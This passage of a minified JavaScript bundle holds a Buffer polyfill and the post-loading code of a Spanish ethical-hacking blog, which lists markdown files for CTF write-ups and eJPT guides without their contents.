p=0,y=Math.min(a,l);p<y;++p)if(e[p]!==n[p]){a=e[p],l=n[p];break}return a<l?-1:l<a?1:0},u.isEncoding=function(e){switch(String(e).toLowerCase()){case"hex":case"utf8":case"utf-8":case"ascii":case"latin1":case"binary":case"base64":case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return!0;default:return!1}},u.concat=function(e,n){if(!Array.isArray(e))throw new TypeError('"list" argument must be an Array of Buffers');if(e.length===0)return u.alloc(0);let a;if(n===void 0)for(n=0,a=0;a<e.length;++a)n+=e[a].length;const l=u.allocUnsafe(n);let p=0;for(a=0;a<e.length;++a){let y=e[a];if($(y,Uint8Array))p+y.length>l.length?(u.isBuffer(y)||(y=u.from(y)),y.copy(l,p)):Uint8Array.prototype.set.call(l,y,p);else if(u.isBuffer(y))y.copy(l,p);else throw new TypeError('"list" argument must be an Array of Buffers');p+=y.length}return l};function N(t,e){if(u.isBuffer(t))return t.length;if(ArrayBuffer.isView(t)||$(t,ArrayBuffer))return t.byteLength;if(typeof t!="string")throw new TypeError('The "string" argument must be one of type string, Buffer, or ArrayBuffer. Received type '+typeof t);const n=t.length,a=arguments.length>2&&arguments[2]===!0;if(!a&&n===0)return 0;let l=!1;for(;;)switch(e){case"ascii":case"latin1":case"binary":return n;case"utf8":case"utf-8":return ye(t).length;case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return n*2;case"hex":return n>>>1;case"base64":return ve(t).length;default:if(l)return a?-1:ye(t).length;e=(""+e).toLowerCase(),l=!0}}u.byteLength=N;function B(t,e,n){let a=!1;if((e===void 0||e<0)&&(e=0),e>this.length||((n===void 0||n>this.length)&&(n=this.length),n<=0)||(n>>>=0,e>>>=0,n<=e))return"";for(t||(t="utf8");;)switch(t){case"hex":return oe(this,e,n);case"utf8":case"utf-8":return Q(this,e,n);case"ascii":return be(this,e,n);case"latin1":case"binary":return F(this,e,n);case"base64":return te(this,e,n);case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return pe(this,e,n);default:if(a)throw new TypeError("Unknown encoding: "+t);t=(t+"").toLowerCase(),a=!0}}u.prototype._isBuffer=!0;function D(t,e,n){const a=t[e];t[e]=t[n],t[n]=a}u.prototype.swap16=function(){const e=this.length;if(e%2!==0)throw new RangeError("Buffer size must be a multiple of 16-bits");for(let n=0;n<e;n+=2)D(this,n,n+1);return this},u.prototype.swap32=function(){const e=this.length;if(e%4!==0)throw new RangeError("Buffer size must be a multiple of 32-bits");for(let n=0;n<e;n+=4)D(this,n,n+3),D(this,n+1,n+2);return this},u.prototype.swap64=function(){const e=this.length;if(e%8!==0)throw new RangeError("Buffer size must be a multiple of 64-bits");for(let n=0;n<e;n+=8)D(this,n,n+7),D(this,n+1,n+6),D(this,n+2,n+5),D(this,n+3,n+4);return this},u.prototype.toString=function(){const e=this.length;return e===0?"":arguments.length===0?Q(this,0,e):B.apply(this,arguments)},u.prototype.toLocaleString=u.prototype.toString,u.prototype.equals=function(e){if(!u.isBuffer(e))throw new TypeError("Argument must be a Buffer");return this===e?!0:u.compare(this,e)===0},u.prototype.inspect=function(){let e="";const n=o.INSPECT_MAX_BYTES;return e=this.toString("hex",0,n).replace(/(.{2})/g,"$1 ").trim(),this.length>n&&(e+=" ... "),"<Buffer "+e+">"},c&&(u.prototype[c]=u.prototype.inspect),u.prototype.compare=function(e,n,a,l,p){if($(e,Uint8Array)&&(e=u.from(e,e.offset,e.byteLength)),!u.isBuffer(e))throw new TypeError('The "target" argument must be one of type Buffer or Uint8Array. Received type '+typeof e);if(n===void 0&&(n=0),a===void 0&&(a=e?e.length:0),l===void 0&&(l=0),p===void 0&&(p=this.length),n<0||a>e.length||l<0||p>this.length)throw new RangeError("out of range index");if(l>=p&&n>=a)return 0;if(l>=p)return-1;if(n>=a)return 1;if(n>>>=0,a>>>=0,l>>>=0,p>>>=0,this===e)return 0;let y=p-l,A=a-n;const q=Math.min(y,A),C=this.slice(l,p),_=e.slice(n,a);for(let R=0;R<q;++R)if(C[R]!==_[R]){y=C[R],A=_[R];break}return y<A?-1:A<y?1:0};function O(t,e,n,a,l){if(t.length===0)return-1;if(typeof n=="string"?(a=n,n=0):n>2147483647?n=2147483647:n<-2147483648&&(n=-2147483648),n=+n,xe(n)&&(n=l?0:t.length-1),n<0&&(n=t.length+n),n>=t.length){if(l)return-1;n=t.length-1}else if(n<0)if(l)n=0;else return-1;if(typeof e=="string"&&(e=u.from(e,a)),u.isBuffer(e))return e.length===0?-1:L(t,e,n,a,l);if(typeof e=="number")return e=e&255,typeof Uint8Array.prototype.indexOf=="function"?l?Uint8Array.prototype.indexOf.call(t,e,n):Uint8Array.prototype.lastIndexOf.call(t,e,n):L(t,[e],n,a,l);throw new TypeError("val must be string, number or Buffer")}function L(t,e,n,a,l){let p=1,y=t.length,A=e.length;if(a!==void 0&&(a=String(a).toLowerCase(),a==="ucs2"||a==="ucs-2"||a==="utf16le"||a==="utf-16le")){if(t.length<2||e.length<2)return-1;p=2,y/=2,A/=2,n/=2}function q(_,R){return p===1?_[R]:_.readUInt16BE(R*p)}let C;if(l){let _=-1;for(C=n;C<y;C++)if(q(t,C)===q(e,_===-1?0:C-_)){if(_===-1&&(_=C),C-_+1===A)return _*p}else _!==-1&&(C-=C-_),_=-1}else for(n+A>y&&(n=y-A),C=n;C>=0;C--){let _=!0;for(let R=0;R<A;R++)if(q(t,C+R)!==q(e,R)){_=!1;break}if(_)return C}return-1}u.prototype.includes=function(e,n,a){return this.indexOf(e,n,a)!==-1},u.prototype.indexOf=function(e,n,a){return O(this,e,n,a,!0)},u.prototype.lastIndexOf=function(e,n,a){return O(this,e,n,a,!1)};function z(t,e,n,a){n=Number(n)||0;const l=t.length-n;a?(a=Number(a),a>l&&(a=l)):a=l;const p=e.length;a>p/2&&(a=p/2);let y;for(y=0;y<a;++y){const A=parseInt(e.substr(y*2,2),16);if(xe(A))return y;t[n+y]=A}return y}function Y(t,e,n,a){return de(ye(e,t.length-n),t,n,a)}function ae(t,e,n,a){return de(ne(e),t,n,a)}function ie(t,e,n,a){return de(ve(e),t,n,a)}function fe(t,e,n,a){return de(Ce(e,t.length-n),t,n,a)}u.prototype.write=function(e,n,a,l){if(n===void 0)l="utf8",a=this.length,n=0;else if(a===void 0&&typeof n=="string")l=n,a=this.length,n=0;else if(isFinite(n))n=n>>>0,isFinite(a)?(a=a>>>0,l===void 0&&(l="utf8")):(l=a,a=void 0);else throw new Error("Buffer.write(string, encoding, offset[, length]) is no longer supported");const p=this.length-n;if((a===void 0||a>p)&&(a=p),e.length>0&&(a<0||n<0)||n>this.length)throw new RangeError("Attempt to write outside buffer bounds");l||(l="utf8");let y=!1;for(;;)switch(l){case"hex":return z(this,e,n,a);case"utf8":case"utf-8":return Y(this,e,n,a);case"ascii":case"latin1":case"binary":return ae(this,e,n,a);case"base64":return ie(this,e,n,a);case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return fe(this,e,n,a);default:if(y)throw new TypeError("Unknown encoding: "+l);l=(""+l).toLowerCase(),y=!0}},u.prototype.toJSON=function(){return{type:"Buffer",data:Array.prototype.slice.call(this._arr||this,0)}};function te(t,e,n){return e===0&&n===t.length?i.fromByteArray(t):i.fromByteArray(t.slice(e,n))}function Q(t,e,n){n=Math.min(t.length,n);const a=[];let l=e;for(;l<n;){const p=t[l];let y=null,A=p>239?4:p>223?3:p>191?2:1;if(l+A<=n){let q,C,_,R;switch(A){case 1:p<128&&(y=p);break;case 2:q=t[l+1],(q&192)===128&&(R=(p&31)<<6|q&63,R>127&&(y=R));break;case 3:q=t[l+1],C=t[l+2],(q&192)===128&&(C&192)===128&&(R=(p&15)<<12|(q&63)<<6|C&63,R>2047&&(R<55296||R>57343)&&(y=R));break;case 4:q=t[l+1],C=t[l+2],_=t[l+3],(q&192)===128&&(C&192)===128&&(_&192)===128&&(R=(p&15)<<18|(q&63)<<12|(C&63)<<6|_&63,R>65535&&R<1114112&&(y=R))}}y===null?(y=65533,A=1):y>65535&&(y-=65536,a.push(y>>>10&1023|55296),y=56320|y&1023),a.push(y),l+=A}return Pe(a)}const Z=4096;function Pe(t){const e=t.length;if(e<=Z)return String.fromCharCode.apply(String,t);let n="",a=0;for(;a<e;)n+=String.fromCharCode.apply(String,t.slice(a,a+=Z));return n}function be(t,e,n){let a="";n=Math.min(t.length,n);for(let l=e;l<n;++l)a+=String.fromCharCode(t[l]&127);return a}function F(t,e,n){let a="";n=Math.min(t.length,n);for(let l=e;l<n;++l)a+=String.fromCharCode(t[l]);return a}function oe(t,e,n){const a=t.length;(!e||e<0)&&(e=0),(!n||n<0||n>a)&&(n=a);let l="";for(let p=e;p<n;++p)l+=Ae[t[p]];return l}function pe(t,e,n){const a=t.slice(e,n);let l="";for(let p=0;p<a.length-1;p+=2)l+=String.fromCharCode(a[p]+a[p+1]*256);return l}u.prototype.slice=function(e,n){const a=this.length;e=~~e,n=n===void 0?a:~~n,e<0?(e+=a,e<0&&(e=0)):e>a&&(e=a),n<0?(n+=a,n<0&&(n=0)):n>a&&(n=a),n<e&&(n=e);const l=this.subarray(e,n);return Object.setPrototypeOf(l,u.prototype),l};function W(t,e,n){if(t%1!==0||t<0)throw new RangeError("offset is not uint");if(t+e>n)throw new RangeError("Trying to access beyond buffer length")}u.prototype.readUintLE=u.prototype.readUIntLE=function(e,n,a){e=e>>>0,n=n>>>0,a||W(e,n,this.length);let l=this[e],p=1,y=0;for(;++y<n&&(p*=256);)l+=this[e+y]*p;return l},u.prototype.readUintBE=u.prototype.readUIntBE=function(e,n,a){e=e>>>0,n=n>>>0,a||W(e,n,this.length);let l=this[e+--n],p=1;for(;n>0&&(p*=256);)l+=this[e+--n]*p;return l},u.prototype.readUint8=u.prototype.readUInt8=function(e,n){return e=e>>>0,n||W(e,1,this.length),this[e]},u.prototype.readUint16LE=u.prototype.readUInt16LE=function(e,n){return e=e>>>0,n||W(e,2,this.length),this[e]|this[e+1]<<8},u.prototype.readUint16BE=u.prototype.readUInt16BE=function(e,n){return e=e>>>0,n||W(e,2,this.length),this[e]<<8|this[e+1]},u.prototype.readUint32LE=u.prototype.readUInt32LE=function(e,n){return e=e>>>0,n||W(e,4,this.length),(this[e]|this[e+1]<<8|this[e+2]<<16)+this[e+3]*16777216},u.prototype.readUint32BE=u.prototype.readUInt32BE=function(e,n){return e=e>>>0,n||W(e,4,this.length),this[e]*16777216+(this[e+1]<<16|this[e+2]<<8|this[e+3])},u.prototype.readBigUInt64LE=r(function(e){e=e>>>0,re(e,"offset");const n=this[e],a=this[e+7];(n===void 0||a===void 0)&&ue(e,this.length-8);const l=n+this[++e]*2**8+this[++e]*2**16+this[++e]*2**24,p=this[++e]+this[++e]*2**8+this[++e]*2**16+a*2**24;return BigInt(l)+(BigInt(p)<<BigInt(32))}),u.prototype.readBigUInt64BE=r(function(e){e=e>>>0,re(e,"offset");const n=this[e],a=this[e+7];(n===void 0||a===void 0)&&ue(e,this.length-8);const l=n*2**24+this[++e]*2**16+this[++e]*2**8+this[++e],p=this[++e]*2**24+this[++e]*2**16+this[++e]*2**8+a;return(BigInt(l)<<BigInt(32))+BigInt(p)}),u.prototype.readIntLE=function(e,n,a){e=e>>>0,n=n>>>0,a||W(e,n,this.length);let l=this[e],p=1,y=0;for(;++y<n&&(p*=256);)l+=this[e+y]*p;return p*=128,l>=p&&(l-=Math.pow(2,8*n)),l},u.prototype.readIntBE=function(e,n,a){e=e>>>0,n=n>>>0,a||W(e,n,this.length);let l=n,p=1,y=this[e+--l];for(;l>0&&(p*=256);)y+=this[e+--l]*p;return p*=128,y>=p&&(y-=Math.pow(2,8*n)),y},u.prototype.readInt8=function(e,n){return e=e>>>0,n||W(e,1,this.length),this[e]&128?(255-this[e]+1)*-1:this[e]},u.prototype.readInt16LE=function(e,n){e=e>>>0,n||W(e,2,this.length);const a=this[e]|this[e+1]<<8;return a&32768?a|4294901760:a},u.prototype.readInt16BE=function(e,n){e=e>>>0,n||W(e,2,this.length);const a=this[e+1]|this[e]<<8;return a&32768?a|4294901760:a},u.prototype.readInt32LE=function(e,n){return e=e>>>0,n||W(e,4,this.length),this[e]|this[e+1]<<8|this[e+2]<<16|this[e+3]<<24},u.prototype.readInt32BE=function(e,n){return e=e>>>0,n||W(e,4,this.length),this[e]<<24|this[e+1]<<16|this[e+2]<<8|this[e+3]},u.prototype.readBigInt64LE=r(function(e){e=e>>>0,re(e,"offset");const n=this[e],a=this[e+7];(n===void 0||a===void 0)&&ue(e,this.length-8);const l=this[e+4]+this[e+5]*2**8+this[e+6]*2**16+(a<<24);return(BigInt(l)<<BigInt(32))+BigInt(n+this[++e]*2**8+this[++e]*2**16+this[++e]*2**24)}),u.prototype.readBigInt64BE=r(function(e){e=e>>>0,re(e,"offset");const n=this[e],a=this[e+7];(n===void 0||a===void 0)&&ue(e,this.length-8);const l=(n<<24)+this[++e]*2**16+this[++e]*2**8+this[++e];return(BigInt(l)<<BigInt(32))+BigInt(this[++e]*2**24+this[++e]*2**16+this[++e]*2**8+a)}),u.prototype.readFloatLE=function(e,n){return e=e>>>0,n||W(e,4,this.length),s.read(this,e,!0,23,4)},u.prototype.readFloatBE=function(e,n){return e=e>>>0,n||W(e,4,this.length),s.read(this,e,!1,23,4)},u.prototype.readDoubleLE=function(e,n){return e=e>>>0,n||W(e,8,this.length),s.read(this,e,!0,52,8)},u.prototype.readDoubleBE=function(e,n){return e=e>>>0,n||W(e,8,this.length),s.read(this,e,!1,52,8)};function K(t,e,n,a,l,p){if(!u.isBuffer(t))throw new TypeError('"buffer" argument must be a Buffer instance');if(e>l||e<p)throw new RangeError('"value" argument is out of bounds');if(n+a>t.length)throw new RangeError("Index out of range")}u.prototype.writeUintLE=u.prototype.writeUIntLE=function(e,n,a,l){if(e=+e,n=n>>>0,a=a>>>0,!l){const A=Math.pow(2,8*a)-1;K(this,e,n,a,A,0)}let p=1,y=0;for(this[n]=e&255;++y<a&&(p*=256);)this[n+y]=e/p&255;return n+a},u.prototype.writeUintBE=u.prototype.writeUIntBE=function(e,n,a,l){if(e=+e,n=n>>>0,a=a>>>0,!l){const A=Math.pow(2,8*a)-1;K(this,e,n,a,A,0)}let p=a-1,y=1;for(this[n+p]=e&255;--p>=0&&(y*=256);)this[n+p]=e/y&255;return n+a},u.prototype.writeUint8=u.prototype.writeUInt8=function(e,n,a){return e=+e,n=n>>>0,a||K(this,e,n,1,255,0),this[n]=e&255,n+1},u.prototype.writeUint16LE=u.prototype.writeUInt16LE=function(e,n,a){return e=+e,n=n>>>0,a||K(this,e,n,2,65535,0),this[n]=e&255,this[n+1]=e>>>8,n+2},u.prototype.writeUint16BE=u.prototype.writeUInt16BE=function(e,n,a){return e=+e,n=n>>>0,a||K(this,e,n,2,65535,0),this[n]=e>>>8,this[n+1]=e&255,n+2},u.prototype.writeUint32LE=u.prototype.writeUInt32LE=function(e,n,a){return e=+e,n=n>>>0,a||K(this,e,n,4,4294967295,0),this[n+3]=e>>>24,this[n+2]=e>>>16,this[n+1]=e>>>8,this[n]=e&255,n+4},u.prototype.writeUint32BE=u.prototype.writeUInt32BE=function(e,n,a){return e=+e,n=n>>>0,a||K(this,e,n,4,4294967295,0),this[n]=e>>>24,this[n+1]=e>>>16,this[n+2]=e>>>8,this[n+3]=e&255,n+4};function J(t,e,n,a,l){le(e,a,l,t,n,7);let p=Number(e&BigInt(4294967295));t[n++]=p,p=p>>8,t[n++]=p,p=p>>8,t[n++]=p,p=p>>8,t[n++]=p;let y=Number(e>>BigInt(32)&BigInt(4294967295));return t[n++]=y,y=y>>8,t[n++]=y,y=y>>8,t[n++]=y,y=y>>8,t[n++]=y,n}function me(t,e,n,a,l){le(e,a,l,t,n,7);let p=Number(e&BigInt(4294967295));t[n+7]=p,p=p>>8,t[n+6]=p,p=p>>8,t[n+5]=p,p=p>>8,t[n+4]=p;let y=Number(e>>BigInt(32)&BigInt(4294967295));return t[n+3]=y,y=y>>8,t[n+2]=y,y=y>>8,t[n+1]=y,y=y>>8,t[n]=y,n+8}u.prototype.writeBigUInt64LE=r(function(e,n=0){return J(this,e,n,BigInt(0),BigInt("0xffffffffffffffff"))}),u.prototype.writeBigUInt64BE=r(function(e,n=0){return me(this,e,n,BigInt(0),BigInt("0xffffffffffffffff"))}),u.prototype.writeIntLE=function(e,n,a,l){if(e=+e,n=n>>>0,!l){const q=Math.pow(2,8*a-1);K(this,e,n,a,q-1,-q)}let p=0,y=1,A=0;for(this[n]=e&255;++p<a&&(y*=256);)e<0&&A===0&&this[n+p-1]!==0&&(A=1),this[n+p]=(e/y>>0)-A&255;return n+a},u.prototype.writeIntBE=function(e,n,a,l){if(e=+e,n=n>>>0,!l){const q=Math.pow(2,8*a-1);K(this,e,n,a,q-1,-q)}let p=a-1,y=1,A=0;for(this[n+p]=e&255;--p>=0&&(y*=256);)e<0&&A===0&&this[n+p+1]!==0&&(A=1),this[n+p]=(e/y>>0)-A&255;return n+a},u.prototype.writeInt8=function(e,n,a){return e=+e,n=n>>>0,a||K(this,e,n,1,127,-128),e<0&&(e=255+e+1),this[n]=e&255,n+1},u.prototype.writeInt16LE=function(e,n,a){return e=+e,n=n>>>0,a||K(this,e,n,2,32767,-32768),this[n]=e&255,this[n+1]=e>>>8,n+2},u.prototype.writeInt16BE=function(e,n,a){return e=+e,n=n>>>0,a||K(this,e,n,2,32767,-32768),this[n]=e>>>8,this[n+1]=e&255,n+2},u.prototype.writeInt32LE=function(e,n,a){return e=+e,n=n>>>0,a||K(this,e,n,4,2147483647,-2147483648),this[n]=e&255,this[n+1]=e>>>8,this[n+2]=e>>>16,this[n+3]=e>>>24,n+4},u.prototype.writeInt32BE=function(e,n,a){return e=+e,n=n>>>0,a||K(this,e,n,4,2147483647,-2147483648),e<0&&(e=4294967295+e+1),this[n]=e>>>24,this[n+1]=e>>>16,this[n+2]=e>>>8,this[n+3]=e&255,n+4},u.prototype.writeBigInt64LE=r(function(e,n=0){return J(this,e,n,-BigInt("0x8000000000000000"),BigInt("0x7fffffffffffffff"))}),u.prototype.writeBigInt64BE=r(function(e,n=0){return me(this,e,n,-BigInt("0x8000000000000000"),BigInt("0x7fffffffffffffff"))});function V(t,e,n,a,l,p){if(n+a>t.length)throw new RangeError("Index out of range");if(n<0)throw new RangeError("Index out of range")}function se(t,e,n,a,l){return e=+e,n=n>>>0,l||V(t,e,n,4),s.write(t,e,n,a,23,4),n+4}u.prototype.writeFloatLE=function(e,n,a){return se(this,e,n,!0,a)},u.prototype.writeFloatBE=function(e,n,a){return se(this,e,n,!1,a)};function ce(t,e,n,a,l){return e=+e,n=n>>>0,l||V(t,e,n,8),s.write(t,e,n,a,52,8),n+8}u.prototype.writeDoubleLE=function(e,n,a){return ce(this,e,n,!0,a)},u.prototype.writeDoubleBE=function(e,n,a){return ce(this,e,n,!1,a)},u.prototype.copy=function(e,n,a,l){if(!u.isBuffer(e))throw new TypeError("argument should be a Buffer");if(a||(a=0),!l&&l!==0&&(l=this.length),n>=e.length&&(n=e.length),n||(n=0),l>0&&l<a&&(l=a),l===a||e.length===0||this.length===0)return 0;if(n<0)throw new RangeError("targetStart out of bounds");if(a<0||a>=this.length)throw new RangeError("Index out of range");if(l<0)throw new RangeError("sourceEnd out of bounds");l>this.length&&(l=this.length),e.length-n<l-a&&(l=e.length-n+a);const p=l-a;return this===e&&typeof Uint8Array.prototype.copyWithin=="function"?this.copyWithin(n,a,l):Uint8Array.prototype.set.call(e,this.subarray(a,l),n),p},u.prototype.fill=function(e,n,a,l){if(typeof e=="string"){if(typeof n=="string"?(l=n,n=0,a=this.length):typeof a=="string"&&(l=a,a=this.length),l!==void 0&&typeof l!="string")throw new TypeError("encoding must be a string");if(typeof l=="string"&&!u.isEncoding(l))throw new TypeError("Unknown encoding: "+l);if(e.length===1){const y=e.charCodeAt(0);(l==="utf8"&&y<128||l==="latin1")&&(e=y)}}else typeof e=="number"?e=e&255:typeof e=="boolean"&&(e=Number(e));if(n<0||this.length<n||this.length<a)throw new RangeError("Out of range index");if(a<=n)return this;n=n>>>0,a=a===void 0?this.length:a>>>0,e||(e=0);let p;if(typeof e=="number")for(p=n;p<a;++p)this[p]=e;else{const y=u.isBuffer(e)?e:u.from(e,l),A=y.length;if(A===0)throw new TypeError('The value "'+e+'" is invalid for argument "value"');for(p=0;p<a-n;++p)this[p+n]=y[p%A]}return this};const ee={};function he(t,e,n){ee[t]=class extends n{constructor(){super(),Object.defineProperty(this,"message",{value:e.apply(this,arguments),writable:!0,configurable:!0}),this.name=`${this.name} [${t}]`,this.stack,delete this.name}get code(){return t}set code(l){Object.defineProperty(this,"code",{configurable:!0,enumerable:!0,value:l,writable:!0})}toString(){return`${this.name} [${t}]: ${this.message}`}}}he("ERR_BUFFER_OUT_OF_BOUNDS",function(t){return t?`${t} is outside of buffer bounds`:"Attempt to access memory outside buffer bounds"},RangeError),he("ERR_INVALID_ARG_TYPE",function(t,e){return`The "${t}" argument must be of type number. Received type ${typeof e}`},TypeError),he("ERR_OUT_OF_RANGE",function(t,e,n){let a=`The value of "${t}" is out of range.`,l=n;return Number.isInteger(n)&&Math.abs(n)>2**32?l=ge(String(n)):typeof n=="bigint"&&(l=String(n),(n>BigInt(2)**BigInt(32)||n<-(BigInt(2)**BigInt(32)))&&(l=ge(l)),l+="n"),a+=` It must be ${e}. Received ${l}`,a},RangeError);function ge(t){let e="",n=t.length;const a=t[0]==="-"?1:0;for(;n>=a+4;n-=3)e=`_${t.slice(n-3,n)}${e}`;return`${t.slice(0,n)}${e}`}function Ee(t,e,n){re(e,"offset"),(t[e]===void 0||t[e+n]===void 0)&&ue(e,t.length-(n+1))}function le(t,e,n,a,l,p){if(t>n||t<e){const y=typeof e=="bigint"?"n":"";let A;throw e===0||e===BigInt(0)?A=`>= 0${y} and < 2${y} ** ${(p+1)*8}${y}`:A=`>= -(2${y} ** ${(p+1)*8-1}${y}) and < 2 ** ${(p+1)*8-1}${y}`,new ee.ERR_OUT_OF_RANGE("value",A,t)}Ee(a,l,p)}function re(t,e){if(typeof t!="number")throw new ee.ERR_INVALID_ARG_TYPE(e,"number",t)}function ue(t,e,n){throw Math.floor(t)!==t?(re(t,n),new ee.ERR_OUT_OF_RANGE("offset","an integer",t)):e<0?new ee.ERR_BUFFER_OUT_OF_BOUNDS:new ee.ERR_OUT_OF_RANGE("offset",`>= 0 and <= ${e}`,t)}const Se=/[^+/0-9A-Za-z-_]/g;function we(t){if(t=t.split("=")[0],t=t.trim().replace(Se,""),t.length<2)return"";for(;t.length%4!==0;)t=t+"=";return t}function ye(t,e){e=e||1/0;let n;const a=t.length;let l=null;const p=[];for(let y=0;y<a;++y){if(n=t.charCodeAt(y),n>55295&&n<57344){if(!l){if(n>56319){(e-=3)>-1&&p.push(239,191,189);continue}else if(y+1===a){(e-=3)>-1&&p.push(239,191,189);continue}l=n;continue}if(n<56320){(e-=3)>-1&&p.push(239,191,189),l=n;continue}n=(l-55296<<10|n-56320)+65536}else l&&(e-=3)>-1&&p.push(239,191,189);if(l=null,n<128){if((e-=1)<0)break;p.push(n)}else if(n<2048){if((e-=2)<0)break;p.push(n>>6|192,n&63|128)}else if(n<65536){if((e-=3)<0)break;p.push(n>>12|224,n>>6&63|128,n&63|128)}else if(n<1114112){if((e-=4)<0)break;p.push(n>>18|240,n>>12&63|128,n>>6&63|128,n&63|128)}else throw new Error("Invalid code point")}return p}function ne(t){const e=[];for(let n=0;n<t.length;++n)e.push(t.charCodeAt(n)&255);return e}function Ce(t,e){let n,a,l;const p=[];for(let y=0;y<t.length&&!((e-=2)<0);++y)n=t.charCodeAt(y),a=n>>8,l=n%256,p.push(l),p.push(a);return p}function ve(t){return i.toByteArray(we(t))}function de(t,e,n,a){let l;for(l=0;l<a&&!(l+n>=e.length||l>=t.length);++l)e[l+n]=t[l];return l}function $(t,e){return t instanceof e||t!=null&&t.constructor!=null&&t.constructor.name!=null&&t.constructor.name===e.name}function xe(t){return t!==t}const Ae=(function(){const t="0123456789abcdef",e=new Array(256);for(let n=0;n<16;++n){const a=n*16;for(let l=0;l<16;++l)e[a+l]=t[n]+t[l]}return e})();function r(t){return typeof BigInt>"u"?S:t}function S(){throw new Error("BigInt not supported")}})(buffer)),buffer}var bufferExports=requireBuffer();function parseDateLocal(o){const i=(o||"").trim(),s=/^([0-9]{4})-([0-9]{2})-([0-9]{2})$/.exec(i);if(s){const d=Number(s[1]),f=Number(s[2]),h=Number(s[3]);return new Date(d,f-1,h)}const c=new Date(i);return Number.isFinite(c.getTime())?c:new Date(0)}function toTimestampLocal(o){const i=parseDateLocal(o).getTime();return Number.isFinite(i)?i:0}function formatPostDate(o){return parseDateLocal(o).toLocaleDateString("es-ES",{year:"numeric",month:"short",day:"numeric"})}class Logger{constructor(){Re(this,"isDevelopment",!1)}log(i,s,c,d){const u=[`[${{timestamp:new Date().toISOString()}.timestamp}] [${i.toUpperCase()}] [${s}]`,c,...d?[d]:[]];switch(i){case"debug":this.isDevelopment&&console.debug(...u);break;case"info":console.info(...u);break;case"warn":console.warn(...u);break;case"error":console.error(...u);break}}debug(i,s,c){this.log("debug",i,s,c)}info(i,s,c){this.log("info",i,s,c)}warn(i,s,c){this.log("warn",i,s,c)}error(i,s,c){this.log("error",i,s,c)}}const logger=new Logger,g=globalThis;g.Buffer===void 0&&(g.Buffer=bufferExports.Buffer);function getMarkdownModules(){try{return Object.assign({"/src/posts/Enumeración-Avanzada-con-Nmap-2026-03-16.md":__vite_glob_0_0,"/src/posts/Game-Zone-2025-11-26.md":__vite_glob_0_1,"/src/posts/Mi-experiencia-aprobando-el-eJPT-2026-03-22.md":__vite_glob_0_2,"/src/posts/Por-qué-no-encuentras-bugs-2026-03-17.md":__vite_glob_0_3,"/src/posts/VPN-No-Logs-en-Hacking-Ético-2026-01.09.md":__vite_glob_0_4,"/src/posts/alerta-hackeo-hacienda-2026-02-06.md":__vite_glob_0_5,"/src/posts/analisis-malware-2025-11-02.md":__vite_glob_0_6,"/src/posts/attacktive-directory-2026-01-28.md":__vite_glob_0_7,"/src/posts/basic-pentesting-2025-12-24.md":__vite_glob_0_8,"/src/posts/chocolate-factory-2026-06-12.md":__vite_glob_0_9,"/src/posts/cyber-threat-intelligence-dashboard-2025-12-14.md":__vite_glob_0_10,"/src/posts/fortinet-sqli-rce-2026-02-10.md":__vite_glob_0_11,"/src/posts/guia-completa-preparacion-ejpt-2025-12-08.md":__vite_glob_0_12,"/src/posts/hackthebox-blue-2026-01-12.md":__vite_glob_0_13,"/src/posts/hackthebox-fireflow-2026-06-29.md":__vite_glob_0_14,"/src/posts/hackthebox-shocker-2026-01-05.md":__vite_glob_0_15,"/src/posts/htb-lame-2026-01-01.md":__vite_glob_0_16,"/src/posts/ice-tryhackme-2026-05-27.md":__vite_glob_0_17,"/src/posts/ingeniería-social-2025-11-04.md":__vite_glob_0_18,"/src/posts/introduccion-hacking-etico-2025-11-01.md":__vite_glob_0_19,"/src/posts/kenobi-tryhackme-2026-05-24.md":__vite_glob_0_20,"/src/posts/microsoft-ia-ataques-2026-07-05.md":__vite_glob_0_21,"/src/posts/mr-robots-2025-12-07.md":__vite_glob_0_22,"/src/posts/pen-testing-web-2025-11-03.md":__vite_glob_0_23,"/src/posts/plan-tryhackme-free-ejpt-2025-12-12.md":__vite_glob_0_24,"/src/posts/ruta-ejpt-profesional-2026-01-08.md":__vite_glob_0_25,"/src/posts/seguridad-en-redes-wifi-2025-11-05.md":__vite_glob_0_26,"/src/posts/steel-mountain-2025-12-24.md":__vite_glob_0_27,"/src/posts/tendencias-críticas-2025-11-16.md":__vite_glob_0_28,"/src/posts/tryhackme-lookup-2026-01-25.md":__vite_glob_0_29})}catch(o){return logger.error("posts.getMarkdownModules","Error al obtener módulos markdown",o),{}}}function parseMarkdownFileSync(o,i){try{const{data:s,content:c}=matter(i),f=(o.split("/").pop()||"").replace(/\.md$/i,""),h=f.split("-"),u=h.slice(-3),[m,v,b]=u,x=/^\d{4}$/.test(m||"")&&/^\d{2}$/.test(v||"")&&/^\d{2}$/.test(b||""),E=(x?h.slice(0,-3).join("-"):f).toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g,"").replace(/[^a-z0-9-]+/g,"-").replace(/^-+|-+$/g,"").replace(/-{2,}/g,"-"),w=x?`${m}-${v}-${b}`:"",T=/^\d{4}-\d{2}-\d{2}$/,j=s.date||"",k=w||(T.test(j)?j:"");return{id:E,title:s.title||E.replace(/-/g," ").replace(/\b\w/g,I=>I.toUpperCase()),description:s.description||"",date:k,published:s.published!==!1,tags:Array.isArray(s.tags)?s.tags.map(I=>String(I).toLowerCase()):[],readTime:s.readTime||"",content:c}}catch(s){return logger.error("posts.parsePost",`Error al parsear archivo ${o}`,s),null}}function loadPostsFromMarkdownSync(){try{const o=getMarkdownModules(),i=[];for(const[s,c]of Object.entries(o)){const d=parseMarkdownFileSync(s,c);d&&i.push(d)}return i}catch(o){return logger.error("posts.loadPostsSync","Error al cargar posts desde markdown",o),[]}}async function getAllPosts(){return[...loadPostsFromMarkdownSync()].sort((i,s)=>toTimestampLocal(s.date)-toTimestampLocal(i.date))}async function getPublishedPosts(){return(await getAllPosts()).filter(i=>i.published)}async function getPostById(o){return(await getAllPosts()).find(s=>s.id===o)}async function getPostsByTag(o){return(await getAllPosts()).filter(s=>s.published&&s.tags.includes(o.toLowerCase()))}const subscribers=new Set;async function notifyPostsUpdate(){const o=await getAllPosts();for(const i of subscribers)try{i(o)}catch(s){logger.error("posts.notifyPostsUpdate","Error notificando suscriptor",s)}}function subscribeToPosts(o){return subscribers.add(o),()=>subscribers.delete(o)}const metaWithHot=import.meta;metaWithHot.hot&&metaWithHot.hot.accept(o=>{(o?.notifyPostsUpdate??notifyPostsUpdate)()});function 